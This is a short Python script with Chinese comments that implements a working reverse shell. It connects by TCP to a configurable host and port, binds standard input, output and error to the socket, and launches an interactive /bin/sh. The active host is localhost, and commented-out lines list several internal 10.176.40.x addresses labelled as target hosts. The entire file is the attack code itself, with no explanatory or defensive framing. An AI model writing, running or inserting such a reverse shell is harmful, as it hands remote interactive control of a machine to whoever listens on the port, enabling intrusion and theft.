import socket, subprocess, os, pty

# host = "10.176.40.186"  # 目标主机的 IP 地址
# host = "10.176.40.190"
# host = "10.176.40.187"
host = "127.0.0.1"
port = 7778         # 目标主机的端口号

# 创建一个 TCP 套接字
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 连接到目标主机
s.connect((host, port))

# 将标准输入、输出和错误输出重定向到套接字
os.dup2(s.fileno(), 0)  # 标准输入 (stdin)
os.dup2(s.fileno(), 1)  # 标准输出 (stdout)
os.dup2(s.fileno(), 2)  # 标准错误输出 (stderr)

# 启动一个 shell，并将其输入/输出绑定到套接字
p = subprocess.call(["/bin/sh", "-i"])
